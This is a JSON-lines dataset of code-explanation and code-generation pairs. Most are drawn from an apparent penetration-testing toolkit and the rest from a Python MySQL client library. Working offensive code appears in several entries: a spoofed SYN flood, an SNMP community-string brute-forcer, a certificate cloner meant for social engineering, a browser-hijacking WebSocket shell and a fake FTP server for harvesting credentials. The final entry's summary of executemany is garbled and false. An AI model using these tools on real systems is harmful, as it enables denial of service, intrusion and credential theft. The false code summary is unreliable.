{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nconnecting to an SSL/TLS server, get the certificate and generate a certificate with the same options and field values. Note: The generated certificate is invalid, but can be used for social engineering attacks Example: \\b $ habu.certclone www.google.com 443 /tmp/key.pem /tmp/cert.pem", "response": "def cmd_certclone(hostname, port, keyfile, certfile, copy_extensions, expired, verbose):\n    \"\"\"\n    Connect to an SSL/TLS server, get the certificate and generate\n    a certificate with the same options and field values.\n\n    Note: The generated certificate is invalid, but can be used for social engineering attacks\n\n    Example:\n\n    \\b\n    $ habu.certclone www.google.com 443 /tmp/key.pem /tmp/cert.pem\n    \"\"\"\n\n    context = ssl.create_default_context()\n\n    with socket.create_connection((hostname, port), timeout=3) as sock:\n        with context.wrap_socket(sock, server_hostname=hostname) as ssock:\n            original = ssock.getpeercert(binary_form=True)\n\n    key, cert = certclone(original, copy_extensions=copy_extensions, expired=expired)\n\n    keyfile.write(key)\n    certfile.write(cert)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef cmd_isn(ip, port, count, iface, graph, verbose):\n\n    conf.verb = False\n\n    if iface:\n        conf.iface = iface\n\n    isn_values = []\n\n    for _ in range(count):\n        pkt = IP(dst=ip)/TCP(sport=RandShort(), dport=port, flags=\"S\")\n        ans = sr1(pkt, timeout=0.5)\n        if ans:\n            send(IP(dst=ip)/TCP(sport=pkt[TCP].sport, dport=port, ack=ans[TCP].seq + 1, flags='A'))\n            isn_values.append(ans[TCP].seq)\n            if verbose:\n                ans.show2()\n\n    if graph:\n\n        try:\n            import matplotlib.pyplot as plt\n        except ImportError:\n            print(\"To graph support, install matplotlib\")\n            return 1\n\n        plt.plot(range(len(isn_values)), isn_values, 'ro')\n        plt.show()\n\n    else:\n\n        for v in isn_values:\n            print(v)\n\n    return True", "response": "Create TCP connections and print the initial sequence number for each one."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nlaunch snmp - get queries against an IP and tells you when there is a valid community string.", "response": "def cmd_crack_snmp(ip, community, port, stop, verbose):\n    \"\"\"Launches snmp-get queries against an IP, and tells you when\n    finds a valid community string (is a simple SNMP cracker).\n\n    The dictionary used is the distributed with the onesixtyone tool\n    https://github.com/trailofbits/onesixtyone\n\n    Example:\n\n    \\b\n    # habu.crack.snmp 179.125.234.210\n    Community found: private\n    Community found: public\n\n    Note: You can also receive messages like \\<UNIVERSAL\\> \\<class\n    'scapy.asn1.asn1.ASN1\\_Class\\_metaclass'\\>, I don't know how to supress\n    them for now.\n    \"\"\"\n\n    FILEDIR = os.path.dirname(os.path.abspath(__file__))\n    DATADIR = os.path.abspath(os.path.join(FILEDIR, '../data'))\n    COMMFILE = Path(os.path.abspath(os.path.join(DATADIR, 'dict_snmp.txt')))\n\n    if community:\n        communities = [community]\n    else:\n        with COMMFILE.open() as cf:\n            communities = cf.read().split('\\n')\n\n    conf.verb = False\n\n    for pkt in IP(dst=ip)/UDP(sport=port, dport=port)/SNMP(community=\"public\", PDU=SNMPget(varbindlist=[SNMPvarbind(oid=ASN1_OID(\"1.3.6.1\"))])):\n\n        if verbose:\n            print(pkt[IP].dst)\n\n        for community in communities:\n\n            if verbose:\n                print('.', end='')\n                sys.stdout.flush()\n\n            pkt[SNMP].community=community\n            ans = sr1(pkt, timeout=0.5, verbose=0)\n\n            if ans and UDP in ans:\n                print('\\n{} - Community found: {}'.format(pkt[IP].dst, community))\n                if stop:\n                    break\n\n    return True"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nget the internal IP address of the local interfaces.", "response": "def cmd_ip_internal(verbose):\n    \"\"\"Get the local IP address(es) of the local interfaces.\n\n    Example:\n\n    \\b\n    $ habu.ip.internal\n    {\n      \"lo\": {\n        \"ipv4\": [\n          {\n            \"addr\": \"127.0.0.1\",\n            \"netmask\": \"255.0.0.0\",\n            \"peer\": \"127.0.0.1\"\n          }\n        ],\n        \"link_layer\": [\n          {\n            \"addr\": \"00:00:00:00:00:00\",\n            \"peer\": \"00:00:00:00:00:00\"\n          }\n        ],\n        \"ipv6\": [\n          {\n            \"addr\": \"::1\",\n            \"netmask\": \"ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff/128\"\n          }\n        ]\n      },\n    ...\n    \"\"\"\n    if verbose:\n        logging.basicConfig(level=logging.INFO, format='%(message)s')\n        print(\"Gathering NIC details...\", file=sys.stderr)\n\n    result = get_internal_ip()\n\n    if result:\n        print(json.dumps(result, indent=4))\n    else:\n        print(\"[X] Unable to get detail about the interfaces\")\n\n    return True"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef web_screenshot(url, outfile, browser=None):\n\n    valid_browsers = ['firefox', 'chromium-browser']\n    available_browsers = [ b for b in valid_browsers if which(b) ]\n\n    if not available_browsers:\n        print(\"You don't have firefox or chromium-browser in your PATH\".format(browser), file=sys.stderr)\n        return False\n\n    if not browser:\n        browser = available_browsers[0]\n\n    if browser not in available_browsers:\n        print(\"You don't have {} in your PATH\".format(browser), file=sys.stderr)\n        return False\n\n    #screenshot_cmd = ''\n    #profile_firefox = shlex.split('firefox --new-instance --CreateProfile habu.web.screenshot')\n    #screenshot_firefox = shlex.split('firefox --new-instance --headless -P habu.web.screenshot --screenshot {} {}'.format(outfile, url))\n    #screenshot_chromium = shlex.split('chromium-browser --headless --disable-gpu --window-size=1440,900 --screenshot={} {}'.format(outfile, url))\n\n    if browser == 'firefox':\n        profile_firefox = shlex.split('firefox --new-instance --CreateProfile habu.web.screenshot')\n        subprocess.Popen(profile_firefox, stderr=subprocess.DEVNULL)\n        screenshot_cmd = shlex.split('firefox --new-instance --headless -P habu.web.screenshot --screenshot {} {}'.format(outfile, url))\n\n    if browser == 'chromium-browser':\n        screenshot_cmd = shlex.split('chromium-browser --headless --disable-gpu --window-size=1440,900 --screenshot={} {}'.format(outfile, url))\n\n    outfile = Path(outfile)\n    if outfile.is_file():\n        outfile.unlink()\n\n    with subprocess.Popen(screenshot_cmd, stderr=subprocess.DEVNULL) as proc:\n\n        for count in range(DURATION):\n\n            sleep(1)\n\n            if outfile.is_file():\n                break\n\n            if count == DURATION - 1:\n                print(\"Unable to create screenshot\", file=sys.stderr)\n                break\n\n        proc.kill()\n\n    return True", "response": "Create a screenshot of a website."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nset VALUE to the config KEY.", "response": "def cmd_config_set(key, value):\n    \"\"\"Set VALUE to the config KEY.\n\n    Note: By default, KEY is converted to uppercase.\n\n    Example:\n\n    \\b\n    $ habu.config.set DNS_SERVER 8.8.8.8\n    \"\"\"\n\n    habucfg = loadcfg(environment=False)\n    habucfg[key.upper()] = value\n    with Path('~/.habu.json').expanduser().open('w') as f:\n        f.write(json.dumps(habucfg, indent=4, sort_keys=True))"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nreturning details about the host that is executing habu.", "response": "def gather_details():\n    \"\"\"Get details about the host that is executing habu.\"\"\"\n    try:\n        data = {\n            'kernel': platform.uname(),\n            'distribution': platform.linux_distribution(),\n            'libc': platform.libc_ver(),\n            'arch': platform.machine(),\n            'python_version': platform.python_version(),\n            'os_name': platform.system(),\n            'static_hostname': platform.node(),\n            'cpu': platform.processor(),\n            'fqdn': socket.getfqdn(),\n        }\n    except AttributeError:\n        return {}\n\n    return data"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef cmd_ip2asn(ip):\n\n    try:\n        ipaddress.ip_address(ip)\n    except ValueError:\n        logging.error('Invalid IP address')\n        sys.exit(1)\n\n    data = ip2asn(ip)\n    print(json.dumps(data, indent=4))", "response": "Use Team Cymru ip2asn service to get information about a public IPv4 or IPv6 address."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get_internal_ip():\r\n    nics = {}\r\n    for interface_name in interfaces():\r\n        addresses = ifaddresses(interface_name)\r\n        try:\r\n            nics[interface_name] = {\r\n                'ipv4': addresses[AF_INET],\r\n                'link_layer': addresses[AF_LINK],\r\n                'ipv6': addresses[AF_INET6],\r\n            }\r\n        except KeyError:\r\n            pass\r\n\r\n    return nics", "response": "Get the internal IP addresses."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef geo_location(ip_address):\r\n    try:\r\n        type(ipaddress.ip_address(ip_address))\r\n    except ValueError:\r\n        return {}\r\n\r\n    data = requests.get(\r\n        'https://ipapi.co/{}/json/'.format(ip_address), timeout=5).json()\r\n    return data", "response": "Get the Geolocation of an IP address."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef cmd_shodan_open(ip, no_cache, json_output, nmap_command, verbose, output):\n\n    habucfg = loadcfg()\n\n    if 'SHODAN_APIKEY' not in habucfg:\n        print('You must provide a shodan apikey. Use the ~/.habu.json file (variable SHODAN_APIKEY), or export the variable HABU_SHODAN_APIKEY')\n        print('Get your API key from https://www.shodan.io/')\n        sys.exit(1)\n\n    if verbose:\n        logging.basicConfig(level=logging.INFO, format='%(message)s')\n\n    data = shodan_get_result(ip, habucfg['SHODAN_APIKEY'], no_cache, verbose)\n    ports = []\n\n    if 'data' in data:\n        for service in data['data']:\n            ports.append('{}:{}'.format(\n                service['transport'][0].upper(),\n                service['port']\n            ))\n\n    if nmap_command:\n        if ports:\n            output.write('nmap -A -v -p {} {}'.format(','.join(ports), ip))\n    else:\n        if json_output:\n            output.write(json.dumps(ports, indent=4))\n            output.write('\\n')\n        else:\n            output.write(','.join(ports))", "response": "Output the open ports for an IP against shodan"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef cmd_nmap_ports(scanfile, protocol):\n\n    data = scanfile.read()\n    fmt = detect_format(data)\n\n    if fmt not in ['xml', 'nmap', 'gnmap']:\n        print('Unknown file format.', file=sys.stdout)\n        return 1\n\n    if fmt == 'nmap':\n        result = parse_format_nmap(data, protocol)\n    elif fmt == 'gnmap':\n        result = parse_format_gnmap(data, protocol)\n    elif fmt == 'xml':\n        result = parse_format_xml(data, protocol)\n\n    print(result, end='')\n\n    return True", "response": "Read an nmap report and print the tested ports."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef cmd_web_report(input_file, verbose, browser):\n\n    urls = input_file.read().decode().strip().split('\\n')\n\n    report_dir = Path('report')\n\n    try:\n        report_dir.mkdir()\n    except Exception:\n        pass\n\n    report_file = report_dir / 'index.html'\n\n    with report_file.open('w') as outfile:\n        outfile.write('<!doctype html>\\n')\n        outfile.write('<html lang=en-us>\\n')\n        outfile.write('<meta charset=utf-8>\\n')\n        outfile.write('<title>habu.web.report</title>\\n')\n        outfile.write('<body>\\n')\n        outfile.write('<table border=1 style=\"max-width: 100%\">\\n')\n\n        for i,url in enumerate(sorted(urls)):\n\n            error = False\n\n            print(i, url, file=sys.stderr)\n\n            outfile.write('<tr>\\n')\n            outfile.write('<td style=\"vertical-align:top;max-width:30%\">\\n')\n            outfile.write('<p><strong>' + html.escape(url) + '</strong></p>\\n')\n\n            try:\n                req = urllib.request.Request(url, method='HEAD')\n                resp = urllib.request.urlopen(req)\n                outfile.write('<pre style=\"white-space: pre-wrap;\">' + html.escape(str(resp.headers)) + '</pre>\\n')\n            except Exception as e:\n                outfile.write('<pre>ERROR: ' + html.escape(str(e)) + '</pre>\\n')\n                error = True\n\n            outfile.write('</td><td>')\n\n            if not error:\n                web_screenshot(url, report_dir / '{}.png'.format(i), browser=browser)\n                outfile.write('<img src={}.png style=\"max-width: 100%\" />\\n'.format(i))\n\n            outfile.write('</td>\\n')\n            outfile.write('</tr>\\n')\n\n        outfile.write('</table>\\n')\n        outfile.write('</body>\\n')\n        outfile.write('</html>\\n')", "response": "This command is used to take a screenshot of the websites."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef cmd_synflood(ip, interface, count, port, forgemac, forgeip, verbose):\n\n    conf.verb = False\n\n    if interface:\n        conf.iface = interface\n\n    layer2 = Ether()\n\n    layer3 = IP()\n    layer3.dst = ip\n\n    layer4 = TCP()\n    layer4.dport = port\n\n    pkt = layer2 / layer3 / layer4\n\n    counter = 0\n\n    print(\"Please, remember to block your RST responses\", file=sys.stderr)\n\n    while True:\n        if forgeip:\n            pkt[IP].src = \"%s.%s\" %(pkt[IP].src.rsplit('.', maxsplit=1)[0], randint(1, 254))\n        if forgemac:\n            pkt[Ether].src = RandMAC()\n\n        pkt[TCP].sport = randint(10000, 65000)\n\n        if verbose:\n            print(pkt.summary())\n        else:\n            print('.', end='')\n            sys.stdout.flush()\n\n        sendp(pkt)\n        counter += 1\n\n        if count != 0 and counter == count:\n            break\n\n    return True", "response": "Launch a lot of TCP connections and keep them opened."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nchecks if a given username exists on various social networks and other popular sites.", "response": "def cmd_usercheck(username, no_cache, verbose, wopen):\n    \"\"\"Check if the given username exists on various social networks and other popular sites.\n\n    \\b\n    $ habu.usercheck portantier\n    {\n        \"aboutme\": \"https://about.me/portantier\",\n        \"disqus\": \"https://disqus.com/by/portantier/\",\n        \"github\": \"https://github.com/portantier/\",\n        \"ifttt\": \"https://ifttt.com/p/portantier\",\n        \"lastfm\": \"https://www.last.fm/user/portantier\",\n        \"medium\": \"https://medium.com/@portantier\",\n        \"pastebin\": \"https://pastebin.com/u/portantier\",\n        \"pinterest\": \"https://in.pinterest.com/portantier/\",\n        \"twitter\": \"https://twitter.com/portantier\",\n        \"vimeo\": \"https://vimeo.com/portantier\"\n    }\n    \"\"\"\n\n    habucfg = loadcfg()\n\n    if verbose:\n        logging.basicConfig(level=logging.INFO, format='%(message)s')\n\n    if not no_cache:\n        homedir = pwd.getpwuid(os.getuid()).pw_dir\n        requests_cache.install_cache(homedir + '/.habu_requests_cache')\n        logging.info('using cache on ' + homedir + '/.habu_requests_cache')\n\n    existent = {}\n\n    for site, url in urls.items():\n        u = url.format(username)\n        logging.info(u)\n        try:\n            r = requests.head(u, allow_redirects=False)\n        except Exception:\n            continue\n        if r.status_code == 200:\n            if requests.head(url.format('zei4fee3q9'), allow_redirects=False).status_code == 200:\n                logging.error('Received status 200 for user zei4fee3q9, maybe, the check needs to be fixed')\n            else:\n                existent[site] = u\n                if wopen:\n                    webbrowser.open_new_tab(u)\n\n    print(json.dumps(existent, indent=4))"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef ip2asn(ipaddr):\n\n    try:\n        ip = ipaddress.ip_network(ipaddr)\n    except ValueError:\n        return None\n\n    if ip.is_private:\n        return None\n\n    if ip.version == 4:\n\n        a, b, c, d = str(ip.exploded).split('/')[0].split('.')\n        reversed = \"%s.%s.%s.%s\" % (d, c, b, a)\n        name = \"%s.origin.asn.cymru.com\" % (reversed)\n\n    else:\n        only_addr = str(ip.exploded).split('/')[0].replace(':', '')\n\n        reversed = ''\n\n        for number in only_addr[::-1]:\n\n            reversed += number\n            reversed += '.'\n\n        reversed = reversed.rstrip('.')\n\n        name = \"%s.origin6.asn.cymru.com\" % (reversed)\n\n    try:\n        response = dns.resolver.query(name, 'TXT')\n    except:\n        return None\n\n    # \"15169 | 8.8.4.0/24 | US | arin |\"\n    r = {}\n    r['asn'] = response[0].to_text().split('|')[0].strip(\" \\\"\").split(' ')[0]\n    r['net'] = response[0].to_text().split('|')[1].strip(\" \\\"\")\n    r['cc'] = response[0].to_text().split('|')[2].strip(\" \\\"\")\n    r['rir'] = response[0].to_text().split('|')[3].strip(\" \\\"\").upper()\n    r['asname'] = 'unknown'\n\n    # Get AS Name\n    # \"15169 | US | arin | 2000-03-30 | GOOGLE - Google Inc.,US\"\n    try:\n        name = \"AS%s.asn.cymru.com\" % (r['asn'])\n        response = dns.resolver.query(name, 'TXT')\n        r['asname'] = response[0].to_text().split('|')[4].strip(\" \\\"\")\n    except:\n        pass\n\n    return(r)", "response": "Returns the ASN data associated with an IP address."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ncreating the hash of a given string or file.", "response": "def hasher(data, algos=ALGOS):\n    \"\"\"Create the hash(es) of a given string or file.\"\"\"\n    try:\n        data = data.encode()\n    except Exception:\n        pass\n\n    result = {}\n\n    for algo in sorted(hashlib.algorithms_available):\n        if algo in algos:\n            h = hashlib.new(algo)\n            h.update(data)\n            result[algo] = h.hexdigest()\n\n    return result"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nsending a DHCP request and show what devices have replied.", "response": "def cmd_dhcp_discover(iface, timeout, verbose):\n    \"\"\"Send a DHCP request and show what devices has replied.\n\n    Note: Using '-v' you can see all the options (like DNS servers) included on the responses.\n\n    \\b\n    # habu.dhcp_discover\n    Ether / IP / UDP 192.168.0.1:bootps > 192.168.0.5:bootpc / BOOTP / DHCP\n    \"\"\"\n\n    conf.verb = False\n\n    if iface:\n        conf.iface = iface\n\n    conf.checkIPaddr = False\n\n    hw = get_if_raw_hwaddr(conf.iface)\n\n    ether = Ether(dst=\"ff:ff:ff:ff:ff:ff\")\n    ip = IP(src=\"0.0.0.0\",dst=\"255.255.255.255\")\n    udp = UDP(sport=68,dport=67)\n    bootp = BOOTP(chaddr=hw)\n    dhcp = DHCP(options=[(\"message-type\",\"discover\"),\"end\"])\n\n    dhcp_discover = ether / ip / udp / bootp / dhcp\n\n    ans, unans = srp(dhcp_discover, multi=True, timeout=5)      # Press CTRL-C after several seconds\n\n    for _, pkt in ans:\n        if verbose:\n            print(pkt.show())\n        else:\n            print(pkt.summary())"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef cmd_nmap_excluded(lowest, highest):\n\n    if lowest >= highest:\n        logging.error('lowest can not be greater or equal than highest')\n\n    cfg = loadcfg()\n\n    with (cfg['DATADIR'] / 'nmap-services').open() as nsf:\n        nmap_services = nsf.read()\n\n    unwanted = set()\n\n    for line in nmap_services.strip().split('\\n'):\n        if line.startswith('#'):\n            continue\n\n        service,port,_ = line.split('\\t', maxsplit=2)\n        unwanted.add(int(port.split('/')[0]))\n\n    choices = list(range(lowest,highest))\n    random.shuffle(choices)\n\n    found = False\n    for choice in choices:\n        if choice not in unwanted:\n            print(choice)\n            found = True\n            break\n\n    if not found:\n        logging.error('Can\\'t find a port number with the specified parameters')", "response": "Print a random port that is not present on nmap - services file so is not scanned automatically by nmap."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef cmd_jshell(ip, port, verbose):\n\n    global hook_js\n    hook_js = hook_js.format(ip=ip, port=port)\n\n    print('>>> Listening on {}:{}. Waiting for a victim connection.'.format(ip, port))\n\n    eventloop = asyncio.get_event_loop()\n    eventloop.run_until_complete(websockets.serve(handler, ip, port, create_protocol=MyWebSocketServerProtocol))\n\n    thread = threading.Thread(target=eventloop.run_forever)\n    thread.start()\n\n    completer = WordCompleter(completer_list + list(runner.internal_commands) + list(runner.external_commands))\n    history = InMemoryHistory()\n\n    while True:\n        if not thread.is_alive():\n            break\n\n        cmd = prompt('$ ', patch_stdout=True, completer=completer, history=history, lexer=PygmentsLexer(JavascriptLexer))\n        if cmd:\n            if cmd == '_help':\n                runner.cmd_help()\n            elif runner.sessions:\n                queue.put_nowait(cmd)\n            else:\n                print('>>> No active session!')", "response": "Control a web browser through Websockets and listen for HTTP connections."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nreturns a list of webs hosted on IP", "response": "def get_vhosts(ip, first=1, no_cache=False):\n    \"\"\"Returns a list of webs hosted on IP (checks bing.com)\n    >>> 'www.bing.com' in vhosts(204.79.197.200)\n    True\n    \"\"\"\n\n    if not no_cache:\n        homedir = pwd.getpwuid(os.getuid()).pw_dir\n        requests_cache.install_cache(homedir + '/.habu_requests_cache')\n\n    url = \"http://www.bing.com/search?q=ip:{ip}&first={first}\".format(ip=ip, first=first)\n\n    response = requests.get(url)\n\n    soup = BeautifulSoup(response.text, \"html.parser\")\n\n    vhosts = set()\n\n    for h2 in soup.find_all('h2'):\n        for link in h2.find_all('a'):\n            href = link.get('href')\n\n            if href.startswith('http://') or href.startswith('https://'):\n                vhost = href.split('/')[2]\n                vhosts.add(vhost)\n\n    return list(vhosts)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef cmd_asydns(url, generate, revoke, verbose):\n\n    if verbose:\n        logging.basicConfig(level=logging.INFO, format='%(message)s')\n\n    homedir = Path(pwd.getpwuid(os.getuid()).pw_dir)\n\n    dotdir = homedir / '.asydns'\n    dotdir.mkdir(exist_ok=True)\n\n    pub_file = dotdir / 'rsa.pub'\n    key_file = dotdir / 'rsa.key'\n\n    if generate or not key_file.is_file():\n\n        logging.info('Generating RSA key ...')\n        random_generator = Random.new().read\n        key = RSA.generate(2048, random_generator)\n        pub = key.publickey()\n\n        with key_file.open('w') as k:\n            k.write(key.exportKey('PEM').decode())\n\n        with pub_file.open('w') as p:\n            p.write(pub.exportKey('PEM').decode())\n\n\n    logging.info('Loading RSA key ...')\n    with key_file.open() as k:\n        key = RSA.importKey(k.read())\n\n    with pub_file.open() as p:\n        pub = RSA.importKey(p.read())\n\n\n    r = requests.get(url + '/api')\n\n    if r.status_code != 200:\n        logging.error('Error')\n        logging.error(r.content.decode())\n        return False\n\n    j = r.json()\n\n    challenge = base64.b64decode(j['challenge'])\n    signer = PKCS1_v1_5.new(key)\n    response = signer.sign(SHA224.new(challenge))\n    response = base64.b64encode(response).decode()\n\n    if revoke:\n        r = requests.delete(url + '/api', json={'pub': pub.exportKey('PEM').decode(), 'challenge' : j['challenge'], 'response': response})\n    else:\n        r = requests.post(url + '/api', json={'pub': pub.exportKey('PEM').decode(), 'challenge' : j['challenge'], 'response': response})\n\n    if r.status_code != 200:\n        logging.error('Error')\n        logging.error(r.content.decode())\n        return False\n\n    print(json.dumps(r.json(), indent=4))\n\n    return True", "response": "Generate and load a DNS domain name based on public and private keys using AsyDNS protocol."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef cmd_server_ftp(address, port, enable_ssl, ssl_cert, ssl_key, verbose):\n\n    ssl_context = None\n\n    if enable_ssl:\n\n        if not (ssl_cert and ssl_key):\n            print('Please, specify --ssl-cert and --ssl-key to enable SSL/TLS')\n            return False\n\n        ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)\n        ssl_context.check_hostname = False\n        ssl_context.load_cert_chain(ssl_cert, ssl_key)\n\n    loop = asyncio.get_event_loop()\n    coro = loop.create_server(ServerFTP, host=address, port=port, ssl=ssl_context, reuse_address=True, reuse_port=True)\n    server = loop.run_until_complete(coro)\n    drop_privileges()\n\n    print('Listening on port {}'.format(port))\n\n    try:\n        loop.run_forever()\n    finally:\n        server.close()\n\n    loop.close()", "response": "Basic fake FTP server, whith the only purpose to steal user credentials.\n\n    Supports SSL/TLS.\n\n    Example:\n\n    \\b\n    # sudo habu.server.ftp --ssl --ssl-cert /tmp/cert.pem --ssl-key /tmp/key.pem\n    Listening on port 21\n    Accepted connection from ('192.168.0.27', 56832)\n    Credentials collected from 192.168.0.27! fabian 123456"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nfinding a new gateway.", "response": "def cmd_gateway_find(network, iface, host, tcp, dport, timeout, verbose):\n    \"\"\"\n    Try to reach an external IP using any host has a router.\n\n    Useful to find routers in your network.\n\n    First, uses arping to detect alive hosts and obtain MAC addresses.\n\n    Later, create a network packet and put each MAC address as destination.\n\n    Last, print the devices that forwarded correctly the packets.\n\n    Example:\n\n    \\b\n    # habu.find.gateway 192.168.0.0/24\n    192.168.0.1 a4:08:f5:19:17:a4 Sagemcom\n    192.168.0.7 b0:98:2b:5d:22:70 Sagemcom\n    192.168.0.8 b0:98:2b:5d:1f:e8 Sagemcom\n    \"\"\"\n\n    if verbose:\n        logging.basicConfig(level=logging.INFO, format='%(message)s')\n\n    conf.verb = False\n\n    if iface:\n        conf.iface = iface\n\n    res, unans = srp(Ether(dst=\"ff:ff:ff:ff:ff:ff\")/ARP(pdst=network), timeout=2)\n\n    neighbors = set()\n\n    for _, pkt in res:\n        neighbors.add((pkt['Ether'].src, pkt['Ether'].psrc))\n\n    for mac,ip in neighbors:\n        if tcp:\n            res, unans = srp(Ether(dst=mac)/IP(dst=host)/TCP(dport=dport), timeout=timeout)\n        else:\n            res, unans = srp(Ether(dst=mac)/IP(dst=host)/ICMP(), timeout=timeout)\n        for _,pkt in res:\n            if pkt:\n                if verbose:\n                    print(pkt.show())\n                else:\n                    print(ip, mac, conf.manufdb._get_manuf(mac))"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef cmd_extract_email(infile, verbose, jsonout):\n\n    if verbose:\n        logging.basicConfig(level=logging.INFO, format='%(message)s')\n\n    data = infile.read()\n\n    result = []\n\n    result = extract_email(data)\n\n    if jsonout:\n        print(json.dumps(result, indent=4))\n    else:\n        print('\\n'.join(result))", "response": "Extract email addresses from a file or stdin."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef cmd_karma_bulk(infile, jsonout, badonly, verbose):\n\n    if verbose:\n        logging.basicConfig(level=logging.INFO, format='%(message)s')\n\n    data = infile.read()\n\n    result = {}\n\n    for ip in data.split('\\n'):\n        if ip:\n            logging.info('Checking ' + ip)\n            response = karma(ip)\n            if response:\n                result[ip] = response\n            elif not badonly:\n                result[ip] = ['CLEAN']\n\n    if jsonout:\n        print(json.dumps(result, indent=4))\n    else:\n        for k,v in result.items():\n            print(k, '\\t', ','.join(v))", "response": "List IP addresses inside blacklists using the Karma online service."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\nasync def clear(self):\n        async with self._cond:\n            while self._free:\n                conn = self._free.popleft()\n                await conn.ensure_closed()\n            self._cond.notify()", "response": "Close all free connections in pool."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nterminates pool with instantly closing all acquired connections also.", "response": "def terminate(self):\n        \"\"\"Terminate pool.\n\n        Close pool with instantly closing all acquired connections also.\n        \"\"\"\n\n        self.close()\n\n        for conn in list(self._used):\n            conn.close()\n            self._terminated.add(conn)\n\n        self._used.clear()"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nreleases a free connection back to the connection pool.", "response": "def release(self, conn):\n        \"\"\"Release free connection back to the connection pool.\n\n        This is **NOT** a coroutine.\n        \"\"\"\n        fut = self._loop.create_future()\n        fut.set_result(None)\n\n        if conn in self._terminated:\n            assert conn.closed, conn\n            self._terminated.remove(conn)\n            return fut\n        assert conn in self._used, (conn, self._used)\n        self._used.remove(conn)\n        if not conn.closed:\n            in_trans = conn.get_transaction_status()\n            if in_trans:\n                conn.close()\n                return fut\n            if self._closing:\n                conn.close()\n            else:\n                self._free.append(conn)\n            fut = self._loop.create_task(self._wakeup())\n        return fut"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\nasync def close(self):\n        conn = self._connection\n        if conn is None:\n            return\n        try:\n            while (await self.nextset()):\n                pass\n        finally:\n            self._connection = None", "response": "Closes a cursor just exhausts all remaining data."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\nasync def nextset(self):\n        conn = self._get_db()\n        current_result = self._result\n        if current_result is None or current_result is not conn._result:\n            return\n        if not current_result.has_next:\n            return\n        self._result = None\n        self._clear_result()\n        await conn.next_result()\n        await self._do_get_result()\n        return True", "response": "Get the next query set"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nreturn the exact string that is sent to the database by calling the execute method.", "response": "def mogrify(self, query, args=None):\n        \"\"\" Returns the exact string that is sent to the database by calling\n        the execute() method. This method follows the extension to the DB\n        API 2.0 followed by Psycopg.\n\n        :param query: ``str`` sql statement\n        :param args: ``tuple`` or ``list`` of arguments for sql query\n        \"\"\"\n        conn = self._get_db()\n        if args is not None:\n            query = query % self._escape_args(args, conn)\n        return query"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\nasync def execute(self, query, args=None):\n        conn = self._get_db()\n\n        while (await self.nextset()):\n            pass\n\n        if args is not None:\n            query = query % self._escape_args(args, conn)\n\n        await self._query(query)\n        self._executed = query\n        if self._echo:\n            logger.info(query)\n            logger.info(\"%r\", args)\n        return self._rowcount", "response": "Executes the given operation with any arguments substituting any markers with\n        the given parameters."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\nasync def executemany(self, query, args):\n        if not args:\n            return\n\n        if self._echo:\n            logger.info(\"CALL %s\", query)\n            logger.info(\"%r\", args)\n\n        m = RE_INSERT_VALUES.match(query)\n        if m:\n            q_prefix = m.group(1)\n            q_values = m.group(2).rstrip()\n            q_postfix = m.group(3) or ''\n            assert q_values[0] == '(' and q_values[-1] == ')'\n            return (await self._do_execute_many(\n                q_prefix, q_values, q_postfix, args, self.max_stmt_length,\n                self._get_db().encoding))\n        else:\n            rows = 0\n            for arg in args:\n                await self.execute(query, arg)\n                rows += self._rowcount\n            self._rowcount = rows\n        return self._rowcount", "response": "Execute the given SQL query multiple times and return the number of new employees and phone number."}
